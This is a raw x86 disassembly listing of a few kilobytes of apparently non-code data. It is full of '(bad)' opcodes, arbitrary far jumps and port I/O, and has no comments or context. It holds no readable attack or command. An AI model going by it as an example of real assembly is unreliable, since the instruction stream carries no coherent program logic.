  42e658:	xchg   edx,eax
  42e659:	push   0x25
  42e65b:	(bad)  
  42e65c:	mov    esi,0xbdb76be7
  42e661:	lea    esi,[esi]
  42e663:	inc    edi
  42e664:	dec    ebp
  42e665:	ret    
  42e666:	sti    
  42e667:	stos   BYTE PTR es:[edi],al
  42e668:	pop    ecx
  42e669:	mov    eax,ds:0xc08c3a60
  42e66e:	test   al,0xe1
  42e670:	and    eax,0xae1da4c9
  42e675:	daa    
  42e676:	ret    
  42e677:	adc    BYTE PTR ds:0x94f0ab36,cl
  42e67d:	mov    al,ds:0x847d48a3
  42e682:	or     al,BYTE PTR [esi]
  42e684:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e685:	stc    
  42e686:	or     esp,DWORD PTR [eax+0x412f33b6]
  42e68c:	pushf  
  42e68d:	sbb    esi,DWORD PTR [ecx]
  42e68f:	pusha  
  42e690:	or     esp,DWORD PTR [edi+esi*2]
  42e693:	xor    ebp,DWORD PTR [ecx-0x22]
  42e696:	sbb    ebx,DWORD PTR ds:0x42c50791
  42e69c:	cmp    al,0x46
  42e69e:	(bad)  
  42e69f:	cmp    eax,0xe4023465
  42e6a4:	xchg   ecx,eax
  42e6a5:	push   ebp
  42e6a6:	fdivr  st(0),st
  42e6a8:	jo     0x42e687
  42e6aa:	mov    cl,0xfa
  42e6ac:	dec    ebp
  42e6ad:	test   esp,edi
  42e6af:	out    0x1a,eax
  42e6b1:	cmp    ebx,DWORD PTR [esi+0x5a98a3f4]
  42e6b7:	or     al,0x2b
  42e6b9:	nop
  42e6ba:	jg     0x42e6cd
  42e6bc:	jno    0x42e716
  42e6be:	jmp    0xc67:0x771a6025
  42e6c5:	lea    ebx,[edx+esi*1-0x3ff7f5f9]
  42e6cc:	into   
  42e6cd:	add    eax,0x90c1f47d
  42e6d2:	jae    0x42e72e
  42e6d4:	or     cl,BYTE PTR [esi-0x75]
  42e6d7:	adc    DWORD PTR [edi],ebp
  42e6d9:	stos   BYTE PTR es:[edi],al
  42e6da:	push   cs
  42e6db:	ficomp DWORD PTR [esi]
  42e6dd:	jl     0x42e738
  42e6df:	add    bh,BYTE PTR [ecx*2-0x1e16ac6d]
  42e6e6:	nop
  42e6e7:	inc    esp
  42e6e8:	(bad)  
  42e6e9:	sub    eax,0xb08b632a
  42e6ee:	stos   BYTE PTR es:[edi],al
  42e6ef:	dec    ecx
  42e6f0:	inc    esi
  42e6f1:	mov    ah,0x8e
  42e6f3:	or     ebp,DWORD PTR [ecx-0x79]
  42e6f6:	jnp    0x42e746
  42e6f8:	fcom   st(5)
  42e6fa:	std    
  42e6fb:	dec    edi
  42e6fc:	jmp    0xfc00:0x6e08014f
  42e703:	cmp    eax,0x7df477cd
  42e708:	sub    BYTE PTR [ebp+0x38],al
  42e70b:	imul   edx,DWORD PTR [ebx-0x68],0x1e
  42e70f:	xor    DWORD PTR [eax],eax
	...
  42e771:	add    BYTE PTR [eax],al
  42e773:	add    BYTE PTR [edx+0x39],bl
  42e776:	dec    esi
  42e777:	sub    eax,0x7f7b7f6f
  42e77c:	sub    BYTE PTR fs:[esi],cl
  42e77f:	(bad)  
  42e781:	mov    dh,0xf3
  42e783:	cmp    eax,0x1f148
  42e788:	add    al,0x1
  42e78a:	add    BYTE PTR [eax],al
  42e78c:	push   esi
  42e78d:	fcom   DWORD PTR [edi+eiz*1]
  42e790:	out    0x9,al
  42e792:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e793:	sar    DWORD PTR [eax-0x6a36fcdb],0x20
  42e79a:	(bad)  
  42e79b:	mov    edi,eax
  42e79d:	adc    BYTE PTR [edx],0xe2
  42e7a0:	pop    ecx
  42e7a1:	ficomp DWORD PTR [ebx+0x64]
  42e7a4:	and    ch,dl
  42e7a6:	add    eax,0xa35db18e
  42e7ab:	cmp    edi,ebx
  42e7ad:	xor    bh,BYTE PTR [ebx-0x7df8e342]
  42e7b3:	or     ebx,DWORD PTR [edi-0xa4f64c5]
  42e7b9:	lods   eax,DWORD PTR ds:[esi]
  42e7ba:	aaa    
  42e7bb:	jnp    0x42e799
  42e7bd:	dec    ebp
  42e7be:	rcl    DWORD PTR [ecx],0x58
  42e7c1:	call   0xb280:0x344d
  42e7c7:	mov    dh,0xfb
  42e7c9:	sub    DWORD PTR [eax-0x72],ebx
  42e7cc:	xchg   ebp,eax
  42e7cd:	fadd   DWORD PTR [ebx*1+0x58e2ead0]
  42e7d4:	mov    ebx,0xdc4fd83d
  42e7d9:	xchg   esi,eax
  42e7da:	adc    DWORD PTR [edx-0xf],edx
  42e7dd:	add    DWORD PTR [ecx-0x57f6b0c7],ebx
  42e7e3:	out    dx,eax
  42e7e4:	sbb    eax,0x42dbd93
  42e7e9:	rol    BYTE PTR [ebx],0x1
  42e7ec:	test   eax,0xa4fb46f1
  42e7f1:	xor    BYTE PTR [ecx-0x16be0b24],dl
  42e7f7:	jo     0x42e818
  42e7f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e7fa:	in     al,dx
  42e7fb:	pop    ebx
  42e7fc:	jo     0x42e83f
  42e7fe:	adc    al,0xa4
  42e800:	shl    esp,1
  42e802:	dec    edx
  42e803:	mov    ecx,0xb702c9f5
  42e808:	fstp   QWORD PTR [ecx+0x4f247a96]
  42e80e:	and    edx,esp
  42e810:	or     ch,bl
  42e812:	out    0x38,al
  42e814:	ror    al,0xfe
  42e817:	inc    ebx
  42e818:	xchg   ebx,eax
  42e819:	mov    al,ds:0x4fa45d24
  42e81e:	mov    WORD PTR [edx+0x3],?
  42e821:	sti    
  42e822:	pop    edi
  42e823:	loop   0x42e8a2
  42e825:	stos   DWORD PTR es:[edi],eax
  42e826:	mov    fs,ebp
  42e828:	out    0x98,eax
  42e82a:	fst    QWORD PTR [eax+0x4b]
  42e82d:	pop    DWORD PTR [ebx]
  42e82f:	mov    eax,ds:0x728ea3a5
  42e834:	sbb    al,0x33
  42e836:	loopne 0x42e7f1
  42e838:	mov    bh,0x7b
  42e83a:	push   esi
  42e83b:	fidiv  WORD PTR [esi+0x53]
  42e83e:	shl    dh,0x5e
  42e841:	add    bl,BYTE PTR [eax-0x34]
  42e844:	mov    ebp,0x69bf92c2
  42e849:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e84a:	push   eax
  42e84b:	imul   ch
  42e84d:	inc    ecx
  42e84e:	imul   BYTE PTR [edx]
  42e850:	sub    esi,DWORD PTR [ecx-0x7f]
  42e853:	jp     0x42e85b
  42e855:	mov    dh,0x54
  42e857:	(bad)  
  42e858:	sahf   
  42e859:	scas   eax,DWORD PTR es:[edi]
  42e85a:	mov    edx,DWORD PTR [edx-0x1ce688ea]
  42e860:	(bad)  
  42e861:	adc    al,BYTE PTR [ecx-0xdf03c54]
  42e867:	dec    ecx
  42e868:	adc    DWORD PTR [esi-0x15bd65fd],eax
  42e86e:	adc    BYTE PTR [ecx+0x6],bh
  42e871:	lods   eax,DWORD PTR ds:[esi]
  42e872:	ficom  WORD PTR [ebx-0xf]
  42e875:	or     al,0xa
  42e877:	icebp  
  42e878:	cmp    BYTE PTR [edi+0x1faf8a85],ah
  42e87e:	aam    0xd
  42e880:	clc    
  42e881:	or     al,0xc2
  42e883:	outs   dx,DWORD PTR ds:[esi]
  42e884:	adc    eax,0x31ff32d5
  42e889:	retf   
  42e88a:	cld    
  42e88b:	mov    DWORD PTR [esi],ecx
  42e88d:	leave  
  42e88e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e88f:	add    DWORD PTR [eax],eax
	...
  42e8f1:	add    BYTE PTR [eax],al
  42e8f3:	add    bl,al
  42e8f5:	ja     0x42e957
  42e8f7:	and    al,0xf4
  42e8f9:	aaa    
  42e8fa:	(bad)  
  42e8fb:	div    DWORD PTR [ecx+0x7623f82b]
  42e901:	ror    DWORD PTR [ebp+0x1f24cd4],cl
  42e907:	add    BYTE PTR [ecx+eax*1],al
  42e90a:	add    BYTE PTR [eax],al
  42e90c:	cmp    al,0x58
  42e90e:	adc    DWORD PTR [edx+0x10e28874],eax
  42e914:	iret   
  42e915:	push   edi
  42e916:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e917:	and    eax,eax
  42e919:	shl    BYTE PTR [edi+0x5a],cl
  42e91c:	ins    BYTE PTR es:[edi],dx
  42e91d:	mov    esp,0x96a44efb
  42e922:	in     eax,dx
  42e923:	(bad)  
  42e924:	mov    ecx,DWORD PTR [esi+eax*8]
  42e927:	in     eax,dx
  42e928:	js     0x42e942
  42e92a:	cmc    
  42e92b:	sbb    esp,DWORD PTR [ecx+0x678fb6ff]
  42e931:	inc    eax
  42e932:	mov    ch,0x67
  42e934:	mov    ebp,0x2e1a78e6
  42e939:	in     al,dx
  42e93a:	inc    BYTE PTR [eax]
  42e93c:	sub    DWORD PTR [edx],edx
  42e93e:	mov    bl,0xc7
  42e940:	dec    esp
  42e941:	rol    BYTE PTR [eax+0x4c],cl
  42e944:	fld    QWORD PTR [esp+ecx*2]
  42e947:	aam    0xf1
  42e949:	dec    eax
  42e94a:	aad    0xcd
  42e94c:	xor    ebp,0x64266430
  42e952:	xchg   esp,eax
  42e953:	add    eax,0xdb526d76
  42e958:	or     al,BYTE PTR [edx]
  42e95a:	jge    0x42e963
  42e95c:	cmp    al,0xf5
  42e95e:	jbe    0x42e9ad
  42e960:	push   ecx
  42e961:	mov    DWORD PTR [ebx-0x63],ebx
  42e964:	sub    DWORD PTR [eax-0x58],edx
  42e967:	ror    DWORD PTR [ecx],cl
  42e969:	int    0xf0
  42e96b:	(bad)  
  42e96c:	test   dh,bl
  42e96e:	enter  0xb0bf,0xd6
  42e972:	mov    edi,0x86032cb2
  42e977:	hlt    
  42e978:	or     eax,0xf7069af6
  42e97d:	dec    esp
  42e97e:	out    0x56,al
  42e980:	mov    dl,0x3d
  42e982:	jge    0x42e9b2
  42e984:	inc    eax
  42e985:	fistp  QWORD PTR [eax+0x77238b7c]
  42e98b:	cmp    bl,al
  42e98d:	sbb    DWORD PTR ds:0x71150969,ebx
  42e993:	enter  0x5e69,0xcb
  42e997:	aas    
  42e998:	stos   DWORD PTR es:[edi],eax
  42e999:	mov    DWORD PTR [ecx],esi
  42e99b:	push   0xeb4ec1ee
  42e9a0:	and    eax,0xbb0cdda4
  42e9a5:	addr16 push edx
  42e9a7:	shl    dl,cl
  42e9a9:	mov    dh,BYTE PTR [ebx]
  42e9ab:	out    0x14,eax
  42e9ad:	jo     0x42e994
  42e9af:	jle    0x42e9e6
  42e9b1:	sbb    edx,DWORD PTR [ecx]
  42e9b3:	xor    esi,ebp
  42e9b5:	lea    edx,[eax-0x56]
  42e9b8:	add    ecx,DWORD PTR [esi-0x6d]
  42e9bb:	or     ecx,DWORD PTR [edx+0x160aa99c]
  42e9c1:	cmp    eax,ebx
  42e9c3:	mov    edx,0x37d5b0a6
  42e9c8:	iret   
  42e9c9:	rol    ch,0x70
  42e9cc:	(bad)  
  42e9cd:	xor    BYTE PTR [eax+ebp*1-0x550efe10],bh
  42e9d4:	jmp    0x42e986
  42e9d6:	xor    esi,ebp
  42e9d8:	(bad)  
  42e9d9:	retf   
  42e9da:	inc    ecx
  42e9db:	cwde   
  42e9dc:	(bad)  
  42e9dd:	(bad)  
  42e9de:	out    0x2f,eax
  42e9e0:	xchg   BYTE PTR [edx-0x3a82f8f],al
  42e9e6:	dec    ecx
  42e9e7:	mov    dh,0xf9
  42e9e9:	arpl   WORD PTR [edi+0x17],dx
  42e9ec:	retf   0xb0b6
  42e9ef:	ss aas 
  42e9f1:	mov    edi,0xc7b8bd1a
  42e9f6:	mov    al,ds:0xf4890439
  42e9fb:	lock add ebp,esi
  42e9fe:	dec    ebx
  42e9ff:	push   0xffffffc5
  42ea01:	mov    ecx,0x8f4454de
  42ea06:	sbb    DWORD PTR [eax+0x1e],0x7042c6b1
  42ea0d:	cmp    edi,esp
  42ea0f:	jmp    0x0:0x0
	...
  42ea72:	add    BYTE PTR [eax],al
  42ea74:	in     eax,0xba
  42ea76:	xchg   edx,eax
  42ea77:	jecxz  0x42ea58
  42ea79:	jmp    0x42ea70
  42ea7b:	mov    esi,0x66dc160c
  42ea80:	xchg   edx,eax
  42ea81:	(bad)  
  42ea82:	xor    eax,0x1f3506d
  42ea87:	add    BYTE PTR [ecx+eax*1],al
  42ea8a:	add    BYTE PTR [eax],al
  42ea8c:	add    ebx,edi
  42ea8e:	stc    
  42ea8f:	imul   esp,DWORD PTR [ecx+0x669c8ada],0x6589e6ec
  42ea99:	imul   edi,DWORD PTR [esi-0x1f21b7a0],0x5bac0db2
  42eaa3:	idiv   DWORD PTR [ebp-0x5b28a420]
  42eaa9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42eaaa:	out    dx,al
  42eaab:	pop    edx
  42eaac:	jmp    0x1e4be8a2
  42eab1:	mov    bl,0xd0
  42eab3:	aad    0x4d
  42eab5:	jmp    0x3980:0x53eeb863
  42eabc:	mov    ds:0x365faed5,al
  42eac1:	xor    bl,BYTE PTR [ecx+0x31]
  42eac4:	fld    QWORD PTR [ecx]
  42eac6:	pop    ds
  42eac7:	or     al,0x99
  42eac9:	cmp    eax,0x5296348
  42eace:	or     esp,DWORD PTR [ebx+ecx*8-0x57]
  42ead2:	retf   
  42ead3:	out    dx,eax
  42ead4:	pop    esp
  42ead5:	stos   BYTE PTR es:[edi],al
  42ead6:	pop    eax
  42ead7:	scas   eax,DWORD PTR es:[edi]
  42ead8:	mov    eax,ds:0xc6e5df73
  42eadd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eade:	shr    DWORD PTR [esi+0x59],0x9c
  42eae2:	ds or  ebx,esp
  42eae5:	inc    ebx
  42eae6:	leave  
  42eae7:	jae    0x42eac8
  42eae9:	adc    eax,0x540b4650
  42eaee:	in     eax,dx
  42eaef:	or     eax,0x7caf68ee
  42eaf4:	dec    esi
  42eaf5:	sbb    al,0xbe
  42eaf7:	mov    WORD PTR [edx-0x17835329],gs
  42eafd:	push   ss
  42eafe:	dec    eax
  42eaff:	xchg   ecx,eax
  42eb00:	mov    ebp,0xda852cd9
  42eb05:	out    0x62,al
  42eb07:	sahf   
  42eb08:	mov    dh,0xc3
  42eb0a:	inc    edx
  42eb0b:	sub    esp,ebx
  42eb0d:	sti    
  42eb0e:	pop    edi
  42eb0f:	lock loopne 0x42eb44
  42eb12:	add    BYTE PTR [ecx+0x1b],0x0
  42eb16:	aas    
  42eb17:	scas   eax,DWORD PTR es:[edi]
  42eb18:	mov    ecx,DWORD PTR [eax+0x7ad3b313]
  42eb1e:	addr16 aad 0xae
  42eb21:	jg     0x42eac7
  42eb23:	(bad)  
  42eb24:	sub    eax,0x45de4859
  42eb29:	jnp    0x42eb1a
  42eb2b:	outs   dx,DWORD PTR ds:[esi]
  42eb2c:	enter  0x6c49,0x4
  42eb30:	pop    es
  42eb31:	lods   eax,DWORD PTR ds:[esi]
  42eb32:	mov    bh,0xdb
  42eb34:	xchg   ebx,eax
  42eb35:	jno    0x42eba2
  42eb37:	aad    0x48
  42eb39:	mov    edi,0x7fc034bc
  42eb3e:	mov    esi,0xe9a2d1ca
  42eb43:	stos   BYTE PTR es:[edi],al
  42eb44:	push   es
  42eb45:	jmp    0x42eb12
  42eb47:	mov    ds:0x5f0cbf06,eax
  42eb4c:	gs pusha 
  42eb4e:	into   
  42eb4f:	not    BYTE PTR [ebx-0x51]
  42eb52:	mov    cl,0x43
  42eb54:	mov    dh,0xb3
  42eb56:	loope  0x42eaf6
  42eb58:	out    dx,al
  42eb59:	sub    bh,BYTE PTR [bx+di+0x1]
  42eb5d:	sub    ah,BYTE PTR [eax-0x39]
  42eb60:	adc    edx,ebp
  42eb62:	mov    esp,0xf4a1c2da
  42eb67:	cmp    eax,0xa95bfcf
  42eb6c:	sbb    ch,BYTE PTR fs:[ebx-0x78]
  42eb70:	out    dx,al
  42eb71:	pusha  
  42eb72:	inc    ecx
  42eb73:	jo     0x42eb7e
  42eb75:	mov    al,ds:0x27778bd9
  42eb7a:	push   edx
  42eb7b:	jmp    0x42ebd3
  42eb7d:	in     al,0xda
  42eb7f:	xchg   DWORD PTR [edi],ebx
  42eb81:	retf   0x69cb
  42eb84:	sub    DWORD PTR [edi],0x43
  42eb87:	mov    bl,0xd2
  42eb89:	daa    
  42eb8a:	jp     0x42eb29
  42eb8c:	mov    ds:0x10696a,al
	...
  42ebf1:	add    BYTE PTR [eax],al
  42ebf3:	add    BYTE PTR [esi+0x41],bh
  42ebf6:	jne    0xfc41bb3b
  42ebfc:	pusha  
  42ebfd:	popf   
  42ebfe:	pop    ecx
  42ebff:	add    DWORD PTR [ebx],0x541df47a
  42ec05:	hlt    
  42ec06:	add    DWORD PTR [eax],eax
  42ec08:	add    al,0x1
  42ec0a:	add    BYTE PTR [eax],al
  42ec0c:	mov    edi,0x82fc9d7a
  42ec11:	dec    esp
  42ec12:	sbb    al,BYTE PTR [ebx]
  42ec14:	xor    ecx,0x7a
  42ec17:	mov    bl,0x90
  42ec19:	mov    ecx,0x6fce3e23
  42ec1e:	push   esi
  42ec1f:	adc    eax,0x1e9328ca
  42ec24:	retf   
  42ec25:	pushf  
  42ec26:	popa   
  42ec27:	test   DWORD PTR [ecx+0x170f0f02],eax
  42ec2d:	xlat   BYTE PTR ds:[ebx]
  42ec2e:	mov    ch,0x52
  42ec30:	(bad)  
  42ec31:	mov    WORD PTR [edi+esi*4],es
  42ec34:	push   edi
  42ec35:	add    BYTE PTR [edi+0x40],ch
  42ec38:	push   es
  42ec39:	div    dh
  42ec3b:	(bad)  
  42ec3c:	mov    al,ds:0x16405b93
  42ec41:	push   ebx
  42ec42:	mov    ds:0x202a08ff,al
  42ec47:	xor    esp,ecx
  42ec49:	inc    esp
  42ec4a:	es ds mov eax,0x7e489492
  42ec51:	pop    ecx
  42ec52:	je     0x42ec3c
  42ec54:	and    DWORD PTR [eax-0x14f7d039],edi
  42ec5a:	jbe    0x42ec21
  42ec5c:	call   0x1dd712c5
  42ec61:	fcmove st,st(6)
  42ec63:	lods   al,BYTE PTR ds:[esi]
  42ec64:	out    dx,eax
  42ec65:	sbb    DWORD PTR [edx+0x31079b5e],esi
  42ec6b:	enter  0xd82e,0x22
  42ec6f:	rcr    BYTE PTR [eax+0x7f],0xf5
  42ec73:	inc    edi
  42ec74:	xor    BYTE PTR [ebx+0x37db062b],0xba
  42ec7b:	outs   dx,BYTE PTR ds:[esi]
  42ec7c:	xor    al,0xb2
  42ec7e:	inc    esp
  42ec7f:	sbb    al,0xc5
  42ec81:	mov    bl,BYTE PTR [edi+0x29a43775]
  42ec87:	inc    ebx
  42ec88:	sahf   
  42ec89:	int    0x7e
  42ec8b:	xchg   ebx,eax
  42ec8c:	std    
  42ec8d:	ret    0x8c46
  42ec90:	inc    ebp
  42ec91:	cs jb  0x42eca6
  42ec94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ec95:	mov    bl,0x7d
  42ec97:	jp     0x42ec28
  42ec99:	push   0xffffff9a
  42ec9b:	fwait
  42ec9c:	rcr    DWORD PTR [edx],1
  42ec9e:	dec    eax
  42ec9f:	pop    es
  42eca0:	retf   0xb6bb
  42eca3:	jo     0x42ec88
  42eca5:	adc    cl,BYTE PTR [eax+0xa03bc6]
  42ecab:	or     eax,0x4b98dfea
  42ecb0:	xor    al,0x90
  42ecb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ecb3:	jnp    0x42ec43
  42ecb5:	test   ecx,edi
  42ecb7:	dec    ecx
  42ecb8:	je     0x42ed19
  42ecba:	xchg   esp,eax
  42ecbb:	xor    esi,eax
  42ecbd:	adc    al,0x2
  42ecbf:	push   ebp
  42ecc0:	cmp    bh,cl
  42ecc2:	adc    eax,0xbe16092c
  42ecc7:	sbb    DWORD PTR [eax+0x28],edi
  42ecca:	xchg   ebp,eax
  42eccb:	test   eax,0x231f8c37
  42ecd0:	inc    esi
  42ecd1:	lock xor DWORD PTR [ebp-0x7309f804],esp
  42ecd8:	mov    al,0x28
  42ecda:	jbe    0x42ec8a
  42ecdc:	shl    DWORD PTR [ebx],0xe7
  42ecdf:	push   edx
  42ece0:	nop
  42ece1:	or     eax,0xffffffa8
  42ece4:	test   al,0x53
  42ece6:	aad    0x22
  42ece8:	sbb    dh,ch
  42ecea:	add    eax,0x51f16c12
  42ecef:	cwde   
  42ecf0:	add    eax,0xd0c2dfd4
  42ecf5:	(bad)  
  42ecf6:	vpor   ymm1,ymm7,ymm2
  42ecfa:	xor    eax,0xe5b4fbb4
  42ecff:	call   0xeab3554c
  42ed04:	aaa    
  42ed05:	cmp    ecx,esi
  42ed07:	mov    edi,0xc86e786c
  42ed0c:	cmp    bl,0x7c
  42ed0f:	outs   dx,BYTE PTR ds:[esi]
	...
  42ed74:	sub    dh,dh
  42ed76:	scas   eax,DWORD PTR es:[edi]
  42ed77:	fdivr  st,st(7)
  42ed79:	fnstcw WORD PTR [edi-0xa]
  42ed7c:	jecxz  0x42edb0
  42ed7e:	test   DWORD PTR [edx-0x6bb81848],esp
  42ed84:	pop    eax
  42ed85:	cmc    
  42ed86:	add    DWORD PTR [eax],eax
  42ed88:	add    al,0x1
  42ed8a:	add    BYTE PTR [eax],al
  42ed8c:	mov    ah,0x8d
  42ed8e:	(bad)  
  42ed8f:	out    0xb7,al
  42ed91:	inc    ebp
  42ed92:	imul   eax,DWORD PTR [esi+0x76f48413],0x1b
  42ed99:	arpl   WORD PTR [ecx-0x61],bx
  42ed9c:	(bad)  
  42ed9d:	loop   0x42ee0f
  42ed9f:	adc    bh,BYTE PTR [edx-0xbed54fd]
  42eda5:	jl     0x42edad
  42eda7:	test   ah,dl
  42eda9:	sahf   
  42edaa:	xor    ebx,DWORD PTR [ebx]
  42edac:	push   esi
  42edad:	mov    esi,0xd9895dee
  42edb2:	mov    ecx,0x84c9dd72
  42edb7:	outs   dx,DWORD PTR ds:[esi]
  42edb8:	sbb    edx,DWORD PTR [ebp+eax*2+0x49]
  42edbc:	arpl   bp,dx
  42edbe:	adc    eax,0x4c2b3380
  42edc3:	add    edi,DWORD PTR [eax]
  42edc5:	daa    
  42edc6:	sbb    BYTE PTR [ebx],bh
  42edc8:	xor    ch,BYTE PTR [esi+0x22a45f7f]
  42edce:	and    eax,0xbe3a37fb
  42edd3:	stos   BYTE PTR es:[edi],al
  42edd4:	xchg   DWORD PTR [edi],esp
  42edd6:	inc    esp
  42edd7:	leave  
  42edd8:	add    al,0xe2
  42edda:	mov    eax,ds:0x9c837ef2
  42eddf:	push   0x5e
  42ede1:	pop    eax
  42ede2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ede3:	pop    ebx
  42ede4:	test   BYTE PTR [ebx+0x78],0xa0
  42ede8:	imul   esp,esp,0xffffffc8
  42edeb:	shl    dl,0x76
  42edee:	xchg   ebx,eax
  42edef:	push   ss
  42edf0:	(bad)  
  42edf1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42edf2:	mov    edi,0xb3b2db79
  42edf7:	fist   WORD PTR [ebx+0x40]
  42edfa:	scas   al,BYTE PTR es:[edi]
  42edfb:	aad    0x3a
  42edfd:	test   eax,0x7346142
  42ee02:	mov    dh,0xc5
  42ee04:	pop    esi
  42ee05:	das    
  42ee06:	adc    bh,bh
  42ee08:	adc    BYTE PTR [eax+0x13c1d9d],0xea
  42ee0f:	jbe    0x42ee29
  42ee11:	ret    0xaa4f
  42ee14:	cdq    
  42ee15:	scas   eax,DWORD PTR es:[edi]
  42ee16:	aas    
  42ee17:	cmp    ah,BYTE PTR [edx+0x2fa64ba8]
  42ee1d:	sbb    eax,0xeca5dc5
  42ee22:	and    BYTE PTR [ecx+0x3e98528f],cl
  42ee28:	cmp    DWORD PTR [esi],ecx
  42ee2a:	lods   eax,DWORD PTR ds:[esi]
  42ee2b:	stos   BYTE PTR es:[edi],al
  42ee2c:	mov    ebx,0xbc074a39
  42ee31:	outs   dx,DWORD PTR ds:[esi]
  42ee32:	in     al,0xa9
  42ee34:	dec    esi
  42ee35:	icebp  
  42ee36:	mov    edx,0x151828fa
  42ee3b:	outs   dx,DWORD PTR ds:[esi]
  42ee3c:	adc    BYTE PTR [esi],cl
  42ee3e:	mov    esp,0xe466318c
  42ee43:	loopne 0x42ee02
  42ee45:	push   esi
  42ee46:	mov    al,ds:0xc8c2311
  42ee4b:	ds ins BYTE PTR es:[edi],dx
  42ee4d:	xor    edi,edi
  42ee4f:	mov    eax,ds:0x5a838a47
  42ee54:	pop    ss
  42ee55:	pop    ecx
  42ee56:	sbb    BYTE PTR [eax+0x21],ch
  42ee59:	clc    
  42ee5a:	mov    BYTE PTR [edi+0x46],ch
  42ee5d:	arpl   WORD PTR [ecx],cx
  42ee5f:	sub    al,0x9e
  42ee61:	jecxz  0x42eeb8
  42ee63:	imul   ebx,edi,0x7ffbf130
  42ee69:	mov    bh,0x59
  42ee6b:	fdivr  st,st(5)
  42ee6d:	clc    
  42ee6e:	add    bl,BYTE PTR [esi-0xb2f03fc]
  42ee74:	adc    al,0x4f
  42ee76:	add    DWORD PTR ds:0xaf954cb9,esp
  42ee7c:	popa   
  42ee7d:	cmp    BYTE PTR [eax],0xc0
  42ee80:	(bad)  
  42ee81:	xor    al,0x77
  42ee83:	dec    eax
  42ee84:	mov    eax,edi
  42ee86:	pop    ds
  42ee87:	rcr    DWORD PTR [ecx],cl
  42ee89:	cmp    eax,esi
  42ee8b:	adc    BYTE PTR [ebx-0x53],cl
  42ee8e:	gs inc eax
	...
  42eef4:	ret    
  42eef5:	add    cl,BYTE PTR [eax]
  42eef7:	xor    eax,0xf6ff3fc9
  42eefc:	jb     0x42ef3a
  42eefe:	jae    0x42ef25
  42ef00:	push   esi
  42ef01:	jno    0x42ef40
  42ef03:	xchg   BYTE PTR [esi+esi*8+0x1],bl
  42ef07:	add    BYTE PTR [ecx+eax*1],al
  42ef0a:	add    BYTE PTR [eax],al
  42ef0c:	jno    0x42eed6
  42ef0e:	scas   eax,DWORD PTR es:[edi]
  42ef0f:	fcomp  QWORD PTR [ecx+0x6a]
  42ef12:	lds    edx,FWORD PTR [eax+0x7b]
  42ef15:	ds std 
  42ef17:	fcmovnb st,st(6)
  42ef19:	fucomip st,st(4)
  42ef1b:	call   0x9f4d216b
  42ef20:	pop    eax
  42ef21:	ins    DWORD PTR es:[edi],dx
  42ef22:	push   ss
  42ef23:	inc    edi
  42ef24:	mov    bl,0x87
  42ef26:	mov    cl,0x11
  42ef28:	xor    eax,0x6cb0a419
  42ef2d:	aad    0x21
  42ef2f:	js     0x42ef23
  42ef31:	or     ch,BYTE PTR [esi+0xb1bbbd9]
  42ef37:	xor    BYTE PTR [edi+0x356f3330],dl
  42ef3d:	cmp    dl,ch
  42ef3f:	mov    DWORD PTR [eax],edx
  42ef41:	inc    eax
  42ef42:	lods   eax,DWORD PTR ds:[esi]
  42ef43:	rcl    BYTE PTR [edx+0x9b255b],1
  42ef49:	loope  0x42ef99
  42ef4b:	scas   al,BYTE PTR es:[edi]
  42ef4c:	dec    ecx
  42ef4d:	pop    ecx
  42ef4e:	mov    ah,0xe8
  42ef50:	ins    DWORD PTR es:[edi],dx
  42ef51:	jle    0x42ef51
  42ef53:	jb     0x42efa5
  42ef55:	ins    DWORD PTR es:[edi],dx
  42ef56:	ret    0xd07d
  42ef59:	sub    al,0x99
  42ef5b:	pop    ebp
  42ef5c:	out    0x29,eax
  42ef5e:	data16 (bad) 
  42ef60:	adc    BYTE PTR [eax+0x6d],dl
  42ef63:	add    BYTE PTR [ebx+0x4e],bl
  42ef66:	mul    BYTE PTR [ebp+0x50b9935a]
  42ef6c:	inc    edi
  42ef6d:	sub    ebx,ebx
  42ef6f:	call   FWORD PTR [edi-0x6e]
  42ef72:	adc    ecx,esi
  42ef74:	repnz fwait
  42ef76:	mov    dh,0xfa
  42ef78:	adc    BYTE PTR [esi],ah
  42ef7a:	push   ebx
  42ef7b:	test   eax,0xa3175b4a
  42ef80:	or     DWORD PTR [esi+0x6e],0x98ab5e24
  42ef87:	jno    0x42ef34
  42ef89:	aam    0x98
  42ef8b:	imul   edx,DWORD PTR [edx],0xffffffd9
  42ef8e:	cli    
  42ef8f:	pop    esi
  42ef90:	adc    esi,ebx
  42ef92:	(bad)  
  42ef93:	shr    BYTE PTR [eax],1
  42ef95:	sub    DWORD PTR [ebx+edx*8+0x3b3e109d],eax
  42ef9c:	cmp    DWORD PTR [edi+0x722a1e18],ebx
  42efa2:	sbb    ebp,edx
  42efa4:	sub    ah,BYTE PTR [ebx+0x52]
  42efa7:	sub    edi,DWORD PTR [edx-0x5353dc4d]
  42efad:	add    cl,0xd0
  42efb0:	pop    ebx
  42efb1:	inc    edi
  42efb2:	or     BYTE PTR [ebx-0x62],bh
  42efb5:	sar    ebx,1
  42efb7:	pop    edx
  42efb8:	cmp    ecx,DWORD PTR [edx+0x3]
  42efbb:	cmp    ah,bh
  42efbd:	hlt    
  42efbe:	inc    edx
  42efbf:	or     al,0x97
  42efc1:	pop    eax
  42efc2:	icebp  
  42efc3:	in     eax,dx
  42efc4:	ret    0x9a46
  42efc7:	in     eax,dx
  42efc8:	retf   0x6838
  42efcb:	and    ch,BYTE PTR [edi]
  42efcd:	pop    es
  42efce:	fld    DWORD PTR [ecx-0x26ffd680]
  42efd4:	fucomp st(1)
  42efd6:	sub    BYTE PTR [ecx+0x6],0x66
  42efda:	ror    DWORD PTR [edx+ebp*1],1
  42efdd:	mov    al,0xcb
  42efdf:	add    BYTE PTR [ebp-0x57fef562],cl
  42efe5:	daa    
  42efe6:	loop   0x42ef70
  42efe8:	dec    ecx
  42efe9:	mov    al,ds:0x90588192
